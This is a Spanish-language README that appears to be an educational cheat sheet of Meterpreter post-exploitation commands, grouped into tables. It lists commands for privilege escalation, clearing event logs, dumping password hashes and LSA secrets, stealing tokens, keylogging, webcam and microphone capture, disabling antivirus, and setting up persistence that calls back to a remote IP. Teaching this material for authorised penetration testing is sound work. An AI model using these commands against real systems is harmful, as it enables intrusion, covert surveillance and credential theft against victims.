# 💀 Guía Completa de Comandos de Meterpreter

Meterpreter es una herramienta de **post-explotación** utilizada dentro del framework **Metasploit**.  
Proporciona un entorno interactivo y dinámico para controlar y manipular un sistema comprometido.

La mejor forma de ver todos los comandos disponibles dentro de una sesión activa es ejecutar:
```bash
help
# o simplemente
?
```

---

## 💻 Comandos del Núcleo (Core Commands)

Estos comandos gestionan la sesión y la interacción básica con Meterpreter.

| Comando | Descripción |
|----------|--------------|
| `help` o `?` | Muestra el menú de ayuda con todos los comandos disponibles. |
| `background` o `bg` | Envía la sesión actual a segundo plano (regresa a `msf >`). |
| `sessions` | Lista las sesiones activas y permite interactuar con ellas. |
| `session -i <id>` | Interactúa con una sesión específica. |
| `exit` o `quit` | Finaliza la sesión actual de Meterpreter. |
| `use <módulo>` | Carga un módulo de extensión de Meterpreter (ejemplo: `use stdapi`). |
| `load <módulo>` | Carga una extensión adicional (ejemplo: `load kiwi`). |

---

## 🛠️ Comandos de Sistema y Entorno

Permiten obtener información del sistema y elevar privilegios.

| Comando | Descripción |
|----------|--------------|
| `sysinfo` | Muestra información del sistema operativo, arquitectura, hostname, etc. |
| `getuid` | Muestra el usuario bajo el que se ejecuta Meterpreter. |
| `getsystem` | Intenta elevar privilegios al usuario **SYSTEM**. |
| `ps` | Lista todos los procesos en ejecución. |
| `migrate <PID>` | Migra el proceso de Meterpreter a otro proceso. |
| `shell` | Abre una shell interactiva del sistema (CMD/Bash). |
| `ipconfig` | Muestra la configuración de red. |
| `clearev` | Limpia los registros de eventos (ocultación de actividad). |
| `reboot` | Reinicia el sistema remoto. |
| `shutdown` | Apaga el sistema comprometido. |

---

## 📁 Comandos del Sistema de Archivos

Permiten navegar y manipular el sistema de archivos de la víctima.

| Comando | Descripción |
|----------|--------------|
| `pwd` | Muestra el directorio actual. |
| `cd <ruta>` | Cambia el directorio actual. |
| `ls` | Lista el contenido del directorio. |
| `cat <archivo>` | Muestra el contenido de un archivo. |
| `download <archivo_remoto> <ruta_local>` | Descarga un archivo desde la máquina víctima. |
| `upload <archivo_local> <ruta_remota>` | Sube un archivo a la máquina víctima. |
| `rm <archivo>` | Elimina un archivo. |
| `mkdir <directorio>` | Crea un directorio nuevo. |
| `rmdir <directorio>` | Elimina un directorio. |
| `search -f <patrón>` | Busca archivos según un patrón. |

---

## 🔒 Comandos de Credenciales y Tokens

Permiten manipular privilegios y extraer credenciales.

| Comando | Descripción |
|----------|--------------|
| `hashdump` | Extrae los hashes de contraseñas locales. |
| `load kiwi` | Carga el módulo **Kiwi** (versión de Mimikatz). |
| `creds_all` | Lista todas las credenciales almacenadas. |
| `lsa_dump_sam` | Extrae el SAM desde la memoria. |
| `lsa_dump_secrets` | Extrae secretos de LSA. |
| `kerberos_ticket_list` | Lista tickets de Kerberos activos. |
| `steal_token <PID>` | Roba un token de autenticación. |
| `drop_token` | Vuelve al token original. |

---

## 📸 Comandos de Vigilancia y Espionaje

Permiten obtener información visual o auditiva del entorno.

| Comando | Descripción |
|----------|--------------|
| `screenshot` | Captura una imagen de la pantalla del usuario. |
| `record_mic` | Graba audio desde el micrófono. |
| `webcam_list` | Lista las cámaras disponibles. |
| `webcam_snap` | Toma una foto con la cámara. |
| `webcam_stream` | Transmite video en tiempo real (si es posible). |
| `keyscan_start` | Inicia el keylogger. |
| `keyscan_dump` | Muestra las teclas capturadas. |
| `keyscan_stop` | Detiene el keylogger. |

---

## 🌐 Comandos de Red

Relacionados con la conectividad y el reconocimiento del sistema remoto.

| Comando | Descripción |
|----------|--------------|
| `ifconfig` | Muestra las interfaces y direcciones IP. |
| `route` | Muestra o modifica la tabla de rutas. |
| `portfwd add -l <puerto_local> -p <puerto_remoto> -r <host>` | Crea un túnel de red (port forwarding). |
| `arp` | Muestra la tabla ARP del sistema. |
| `netstat` | Lista conexiones de red activas. |
| `getproxy` | Muestra la configuración del proxy. |
| `ping <host>` | Envía un ping desde el sistema comprometido. |

---

## ⚙️ Comandos de Persistencia y Automatización

Permiten mantener el acceso o ejecutar tareas automáticas.

| Comando | Descripción |
|----------|--------------|
| `run persistence -U -i 5 -p 4444 -r <IP>` | Crea persistencia en Windows (se ejecuta al inicio). |
| `run getgui -e` | Habilita el Escritorio Remoto (RDP). |
| `run checkvm` | Detecta si la víctima está en una máquina virtual. |
| `run killav` | Intenta desactivar antivirus. |
| `run post/windows/manage/migrate` | Migra automáticamente a un proceso seguro. |
| `run scraper` | Extrae información útil del sistema (usuarios, contraseñas, historial). |

---

## 📜 Consejos Prácticos

- Usa `help <comando>` para obtener detalles adicionales.
- Combina `sessions` con `background` para manejar varias víctimas.
- Evita usar `clearev` en entornos de pruebas sin autorización.
- Documenta siempre tus pasos en un entorno controlado o educativo.

---

## ⚠️ Uso Ético

> ⚠️ **Advertencia:**  
> Meterpreter y Metasploit deben utilizarse **únicamente en entornos autorizados**, laboratorios educativos o pruebas de penetración con consentimiento explícito.  
> El uso indebido de estas herramientas puede ser ilegal.

---

## 🧠 Referencias

- [Metasploit Unleashed - Offensive Security](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Meterpreter Documentation](https://docs.rapid7.com/metasploit/meterpreter/)
- [TryHackMe: Metasploit Rooms](https://tryhackme.com/)

---

## 🧑‍🏫 Autor

Explicación elaborada por [Sebastian Peinador](https://www.linkedin.com/in/sebastian-j-peinador/) para propósitos didácticos y de investigación en ciberseguridad ofensiva.

---

## 📄 Licencia

Este material se distribuye bajo la licencia [MIT](LICENSE).

---

> Si te resulta útil, ¡no olvides darle ⭐ al repo o compartirlo!
